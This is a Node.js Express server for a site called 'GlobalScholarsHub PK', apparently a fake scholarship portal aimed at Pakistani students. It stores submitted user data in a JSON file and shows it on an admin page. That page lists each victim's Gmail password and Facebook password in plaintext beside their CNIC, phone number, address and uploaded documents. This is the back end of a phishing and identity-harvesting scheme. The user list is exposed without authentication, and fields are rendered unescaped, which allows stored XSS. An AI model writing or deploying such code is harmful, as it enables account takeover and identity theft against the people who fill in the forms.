const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('.'));

// ===== DATA SAVE KARNE KA API =====
app.post('/api/save-user', (req, res) => {
    const userData = req.body;
    
    userData.submittedAt = new Date().toLocaleString('en-PK', {
        timeZone: 'Asia/Karachi'
    });
    userData.id = Date.now();
    
    let allUsers = [];
    try {
        const fileData = fs.readFileSync('users-data.json', 'utf8');
        allUsers = JSON.parse(fileData);
    } catch (err) {
        allUsers = [];
    }
    
    allUsers.push(userData);
    fs.writeFileSync('users-data.json', JSON.stringify(allUsers, null, 2));
    
    console.log('✅ New user registered:', userData.email || userData.fbEmail || userData.firstName || 'Unknown');
    console.log('📊 Total users:', allUsers.length);
    
    res.json({ 
        success: true, 
        message: 'Data saved successfully!',
        totalUsers: allUsers.length
    });
});

// ===== SAB USERS DEKHNE KA API =====
app.get('/api/users', (req, res) => {
    try {
        const fileData = fs.readFileSync('users-data.json', 'utf8');
        const users = JSON.parse(fileData);
        res.json(users);
    } catch (err) {
        res.json([]);
    }
});

// ===== ADMIN PANEL - FIXED =====
app.get('/admin', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Panel - GlobalScholarsHub PK</title>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f4f8; padding: 20px; }
                .container { max-width: 1300px; margin: 0 auto; }
                
                .header { background: linear-gradient(135deg, #0a1628, #1a365d, #2563eb); color: #fff; padding: 30px 40px; border-radius: 20px; margin-bottom: 30px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
                .header h1 { font-size: 28px; font-weight: 800; }
                .header h1 i { color: #fbbf24; margin-right: 10px; }
                .header p { opacity: 0.8; font-size: 14px; margin-top: 4px; }
                .header .badge { background: rgba(255,255,255,0.15); padding: 6px 16px; border-radius: 50px; font-size: 13px; }
                .header .badge i { color: #fbbf24; margin-right: 6px; }
                
                .refresh-btn { background: #fbbf24; color: #0a1628; border: none; padding: 10px 28px; border-radius: 50px; cursor: pointer; font-weight: 700; font-size: 14px; transition: all 0.3s ease; }
                .refresh-btn:hover { transform: scale(1.05); box-shadow: 0 4px 20px rgba(251, 191, 36, 0.4); }
                .refresh-btn i { margin-right: 8px; }
                
                .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 30px; }
                .stat-card { background: #fff; padding: 22px; border-radius: 16px; text-align: center; border: 1px solid #eef2f6; transition: all 0.3s ease; }
                .stat-card:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,0,0,0.06); }
                .stat-card .number { font-size: 34px; font-weight: 800; color: #2563eb; }
                .stat-card .label { color: #64748b; font-size: 14px; margin-top: 4px; }
                .stat-card .icon { font-size: 24px; color: #2563eb; margin-bottom: 6px; }
                
                .user-card { background: #fff; border-radius: 16px; padding: 24px; margin-bottom: 18px; border: 1px solid #eef2f6; transition: all 0.3s ease; }
                .user-card:hover { box-shadow: 0 4px 20px rgba(0,0,0,0.06); border-color: #2563eb; }
                
                .user-card .card-header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; padding-bottom: 14px; border-bottom: 2px solid #f0f4f8; margin-bottom: 14px; }
                .user-card .card-header .user-id { font-weight: 700; color: #0a1628; font-size: 16px; }
                .user-card .card-header .user-id i { color: #2563eb; margin-right: 8px; }
                .user-card .card-header .timestamp { background: #f0f4f8; padding: 4px 14px; border-radius: 50px; font-size: 12px; color: #64748b; }
                .user-card .card-header .timestamp i { margin-right: 4px; }
                
                .user-card .badges { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
                .user-card .badges .tag { padding: 3px 12px; border-radius: 50px; font-size: 11px; font-weight: 600; }
                .tag-gmail { background: #fce8e6; color: #ea4335; }
                .tag-fb { background: #e8f0fe; color: #1877f2; }
                .tag-profile { background: #d1fae5; color: #059669; }
                .tag-doc { background: #fef3c7; color: #d97706; }
                .tag-img { background: #dbeafe; color: #2563eb; }
                
                .user-card .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 8px 30px; }
                .user-card .data-grid .field { font-size: 14px; padding: 4px 0; border-bottom: 1px solid #f8fafc; }
                .user-card .data-grid .field strong { color: #0a1628; font-weight: 600; }
                .user-card .data-grid .field .value { color: #475569; }
                .user-card .data-grid .field .highlight { color: #2563eb; font-weight: 600; }
                
                .user-card .section-title { font-weight: 600; color: #0a1628; margin-top: 12px; margin-bottom: 6px; font-size: 14px; }
                .user-card .section-title i { color: #2563eb; margin-right: 6px; }
                
                .user-card .image-preview { width: 80px; height: 80px; border-radius: 12px; object-fit: cover; border: 2px solid #eef2f6; margin-top: 6px; cursor: pointer; }
                .user-card .image-preview:hover { border-color: #2563eb; transform: scale(1.05); }
                
                .user-card .doc-gallery { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 8px; }
                .user-card .doc-gallery .doc-item { background: #f8fafc; border-radius: 10px; padding: 10px; text-align: center; border: 1px solid #eef2f6; width: 100px; }
                .user-card .doc-gallery .doc-item img { width: 80px; height: 80px; object-fit: cover; border-radius: 6px; border: 1px solid #e2e8f0; cursor: pointer; }
                .user-card .doc-gallery .doc-item img:hover { border-color: #2563eb; transform: scale(1.05); }
                .user-card .doc-gallery .doc-item .doc-name { font-size: 10px; color: #64748b; margin-top: 4px; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 80px; }
                .user-card .doc-gallery .doc-item .doc-icon { font-size: 36px; color: #94a3b8; display: block; padding: 10px; }
                
                .about-text { background: #f8fafc; padding: 10px 14px; border-radius: 8px; color: #475569; font-size: 14px; margin-top: 6px; border-left: 3px solid #2563eb; }
                
                .total-text { font-size: 16px; color: #0a1628; margin-bottom: 20px; font-weight: 600; }
                .total-text i { color: #2563eb; margin-right: 8px; }
                
                .no-data { text-align: center; padding: 60px; color: #94a3b8; background: #fff; border-radius: 16px; border: 1px solid #eef2f6; }
                .no-data i { font-size: 48px; color: #e2e8f0; margin-bottom: 16px; }
                
                @media (max-width: 768px) {
                    .stats { grid-template-columns: 1fr 1fr; }
                    .header { flex-direction: column; text-align: center; }
                    .data-grid { grid-template-columns: 1fr !important; }
                    .user-card .doc-gallery .doc-item { width: 80px; }
                    .user-card .doc-gallery .doc-item img { width: 60px; height: 60px; }
                }
                @media (max-width: 480px) {
                    .stats { grid-template-columns: 1fr; }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div>
                        <h1><i class="fas fa-user-shield"></i>Admin Panel</h1>
                        <p>GlobalScholarsHub PK - Complete User Data Management</p>
                    </div>
                    <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;">
                        <span class="badge"><i class="fas fa-database"></i> Live Data</span>
                        <button class="refresh-btn" onclick="loadUsers()"><i class="fas fa-sync-alt"></i> Refresh Data</button>
                    </div>
                </div>
                
                <div class="stats" id="statsContainer">
                    <div class="stat-card"><div class="icon"><i class="fas fa-users"></i></div><div class="number" id="totalUsers">0</div><div class="label">Total Users</div></div>
                    <div class="stat-card"><div class="icon"><i class="fas fa-envelope"></i></div><div class="number" id="gmailUsers">0</div><div class="label">Gmail Registrations</div></div>
                    <div class="stat-card"><div class="icon"><i class="fab fa-facebook"></i></div><div class="number" id="fbUsers">0</div><div class="label">Facebook Verified</div></div>
                    <div class="stat-card"><div class="icon"><i class="fas fa-check-circle"></i></div><div class="number" id="profileUsers">0</div><div class="label">Profile Completed</div></div>
                </div>
                
                <div id="usersList"></div>
            </div>
            
            <script>
                async function loadUsers() {
                    try {
                        const response = await fetch('/api/users');
                        const users = await response.json();
                        
                        document.getElementById('totalUsers').textContent = users.length;
                        document.getElementById('gmailUsers').textContent = users.filter(u => u.email).length;
                        document.getElementById('fbUsers').textContent = users.filter(u => u.fbEmail).length;
                        document.getElementById('profileUsers').textContent = users.filter(u => u.profileCompleted).length;
                        
                        const container = document.getElementById('usersList');
                        
                        if (users.length === 0) {
                            container.innerHTML = '<div class="no-data"><i class="fas fa-inbox"></i><br />No users registered yet.</div>';
                            return;
                        }
                        
                        let html = '<div class="total-text"><i class="fas fa-list"></i>Total ' + users.length + ' users registered</div>';
                        
                        users.slice().reverse().forEach((user, index) => {
                            const userNum = users.length - index;
                            const hasGmail = user.email ? true : false;
                            const hasFb = user.fbEmail ? true : false;
                            const hasProfile = user.profileCompleted ? true : false;
                            const hasDocs = user.documents && user.documents.length > 0;
                            const hasImage = user.profileImage ? true : false;
                            
                            html += '<div class="user-card">';
                            html += '<div class="card-header">';
                            html += '<span class="user-id"><i class="fas fa-user-circle"></i>User #' + userNum + '</span>';
                            html += '<span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submittedAt || 'N/A') + '</span>';
                            html += '</div>';
                            
                            html += '<div class="badges">';
                            if (hasGmail) html += '<span class="tag tag-gmail"><i class="fas fa-envelope"></i> Gmail</span>';
                            if (hasFb) html += '<span class="tag tag-fb"><i class="fab fa-facebook"></i> Facebook</span>';
                            if (hasProfile) html += '<span class="tag tag-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>';
                            if (hasDocs) html += '<span class="tag tag-doc"><i class="fas fa-file"></i> ' + user.documents.length + ' Documents</span>';
                            if (hasImage) html += '<span class="tag tag-img"><i class="fas fa-image"></i> Photo</span>';
                            html += '</div>';
                            
                            html += '<div class="data-grid">';
                            if (user.name) html += '<div class="field"><strong>👤 Full Name:</strong> <span class="value">' + user.name + '</span></div>';
                            if (user.firstName) html += '<div class="field"><strong>👤 First Name:</strong> <span class="value">' + user.firstName + '</span></div>';
                            if (user.lastName) html += '<div class="field"><strong>👤 Last Name:</strong> <span class="value">' + user.lastName + '</span></div>';
                            if (user.email) html += '<div class="field"><strong>📧 Gmail:</strong> <span class="value" style="color:#ea4335;font-weight:600;">' + user.email + '</span></div>';
                            if (user.password) html += '<div class="field"><strong>🔑 Gmail Password:</strong> <span class="value">' + user.password + '</span></div>';
                            if (user.fbEmail) html += '<div class="field"><strong>📘 Facebook ID:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fbEmail + '</span></div>';
                            if (user.fbPassword) html += '<div class="field"><strong>🔑 FB Password:</strong> <span class="value">' + user.fbPassword + '</span></div>';
                            if (user.phone) html += '<div class="field"><strong>📱 Phone:</strong> <span class="value">' + user.phone + '</span></div>';
                            if (user.city) html += '<div class="field"><strong>🏙️ City:</strong> <span class="value">' + user.city + '</span></div>';
                            if (user.nationality) html += '<div class="field"><strong>🇵🇰 Nationality:</strong> <span class="value">' + user.nationality + '</span></div>';
                            if (user.country) html += '<div class="field"><strong>🏠 Country:</strong> <span class="value">' + user.country + '</span></div>';
                            if (user.dob) html += '<div class="field"><strong>📅 DOB:</strong> <span class="value">' + user.dob + '</span></div>';
                            if (user.gender) html += '<div class="field"><strong>⚥ Gender:</strong> <span class="value">' + user.gender + '</span></div>';
                            if (user.cnic) html += '<div class="field"><strong>🆔 CNIC:</strong> <span class="value">' + user.cnic + '</span></div>';
                            if (user.educationLevel) html += '<div class="field"><strong>📚 Education:</strong> <span class="value">' + user.educationLevel + '</span></div>';
                            if (user.fieldOfStudy) html += '<div class="field"><strong>📖 Field:</strong> <span class="value">' + user.fieldOfStudy + '</span></div>';
                            if (user.university) html += '<div class="field"><strong>🎓 University:</strong> <span class="value">' + user.university + '</span></div>';
                            if (user.gpa) html += '<div class="field"><strong>📊 GPA:</strong> <span class="value">' + user.gpa + '</span></div>';
                            if (user.address) html += '<div class="field"><strong>🏠 Address:</strong> <span class="value">' + user.address + '</span></div>';
                            if (user.skills) html += '<div class="field"><strong>🔧 Skills:</strong> <span class="value">' + user.skills + '</span></div>';
                            html += '</div>';
                            
                            if (user.about) {
                                html += '<div class="section-title"><i class="fas fa-quote-left"></i>About</div>';
                                html += '<div class="about-text">' + user.about + '</div>';
                            }
                            
                            if (hasDocs) {
                                html += '<div class="section-title"><i class="fas fa-file-upload"></i>Documents Uploaded (' + user.documents.length + ')</div>';
                                html += '<div class="doc-gallery">';
                                for (let i = 0; i < user.documents.length; i++) {
                                    const doc = user.documents[i];
                                    const ext = doc.split('.').pop().toLowerCase();
                                    const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp', 'svg'].includes(ext);
                                    html += '<div class="doc-item">';
                                    if (isImage) {
                                        html += '<img src="data:image/' + ext + ';base64,' + doc + '" alt="' + doc + '" title="' + doc + '" onclick="window.open(this.src)" />';
                                    } else {
                                        html += '<div class="doc-icon"><i class="fas fa-file"></i></div>';
                                    }
                                    html += '<span class="doc-name">' + doc + '</span>';
                                    html += '</div>';
                                }
                                html += '</div>';
                            }
                            
                            if (hasImage) {
                                html += '<div class="section-title"><i class="fas fa-image"></i>Profile Image</div>';
                                html += '<img src="' + user.profileImage + '" class="image-preview" alt="Profile" onclick="window.open(this.src)" />';
                            }
                            
                            html += '</div>';
                        });
                        
                        container.innerHTML = html;
                    } catch (error) {
                        console.error('Error:', error);
                        document.getElementById('usersList').innerHTML = '<div class="no-data"><i class="fas fa-exclamation-triangle"></i><br />Error loading data. Make sure server is running.</div>';
                    }
                }
                loadUsers();
            </script>
        </body>
        </html>
    `);
});

// ===== SERVER START =====
app.listen(PORT, () => {
    console.log('========================================');
    console.log('🚀 Server is running!');
    console.log('========================================');
    console.log('📊 Admin Panel: http://localhost:3000/admin');
    console.log('📋 API: http://localhost:3000/api/users');
    console.log('========================================');
    console.log('✅ Users data will be saved in: users-data.json');
    console.log('========================================');
});